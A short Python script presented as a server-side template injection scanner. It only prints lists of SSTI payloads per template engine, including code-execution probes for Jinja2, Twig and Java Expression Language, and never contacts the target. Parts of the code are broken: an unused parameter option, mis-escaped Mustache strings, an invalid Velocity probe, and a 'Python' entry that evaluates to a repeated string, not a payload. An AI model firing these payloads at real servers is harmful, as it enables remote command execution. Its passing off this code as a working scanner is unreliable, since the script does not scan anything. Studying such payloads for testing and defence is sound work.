#!/usr/bin/env python3
"""Server-Side Template Injection Scanner"""
import argparse
import sys

PATTERNS = {
    "Jinja2": ["{{7*7}}", "{{config}}", "{{().__class__.__mro__[1].__subclasses__()}}"],
    "Twig": ["{{7*7}}", "{{app.request.cookies}}", "{{_self.env.registerUndefinedFilterCallback('system')}}"],
    "Mustache": ["{{{{7*7}}}}", "{{{{obj}}}}"],
    "Freemarker": ["${7*7}", "${class.getClassLoader()}"],
    "Velocity": ["${7*7}", "${import java.io.*;}"],
    "Expression Language": ["${7*7}", "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}"],
    "Python": ["%s%%s" % 7*7, "{% print 7*7 %}"],
}

def test_ssti(target, engine):
    print(f"[*] Testing {engine} on: {target}")
    for pattern in PATTERNS.get(engine, []):
        print(f"  [+] Test: {pattern}")
    print()
    print("[!] Manual testing required for confirmation")
    print("[→] Look for numeric response (49) instead of expression")

def main():
    parser = argparse.ArgumentParser(description="SSTI Scanner v1.0")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--engine", "-e", choices=list(PATTERNS.keys()), default="Jinja2")
    parser.add_argument("--param", "-p", default="test", help="Parameter to test")
    args = parser.parse_args()
    test_ssti(args.target, args.engine)

if __name__ == "__main__":
    main()
